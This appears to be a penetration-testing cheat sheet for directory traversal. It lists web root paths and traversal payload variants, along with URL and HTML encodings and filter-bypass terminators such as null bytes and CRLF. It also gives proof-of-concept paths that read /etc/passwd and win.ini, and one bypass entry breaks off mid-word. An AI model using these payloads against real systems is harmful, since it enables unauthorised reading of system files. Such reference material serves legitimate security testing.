# Directory Traversal
## Common Directories
- Apache 
	- `/var/www`
	- `/var/www/images`
	- `/var/www/static`
- IIS
	- `C:\inetpub\wwwroot`

## Quick Checks
- `./<PATH>`
- `/etc/passwd` `/windows/win.ini`
- `.\/<PATH>`
- `.//<PATH>`
- `.\\<PATH>`
- `....//<PATH>`
- `....\/<PATH>`
### Encodings
**Worth trying to double-encode as well**
#### URL Encoding
**Note you can either encode the entire URL code, or just the letters**
- `.` -> `%2e`
- `/` ->`%2f`
- `\` -> `%5c`
#### HTML Encoding
**Useful for DOM reflections**
- `a` -> `\u0061`
### Bypass
**Useful for bypassing regex enforcing extensions**
- Leading zeros - `%[0]*<URL ENCODING>`
- Null byte termination - `%00`
- Line feed termination - `\n` `%0a`
- Carriage return termination - `\r` `%0d`
- Carriage return Line feed termination - `\r\n` `%0d0a`
- Space termination - ` ` `%20` `+`
- Comment t

## System Info / POC
- Unix
	- `../[../]*/etc/passwd`
- Windows
	- `..\[..\]*\windows\win.ini`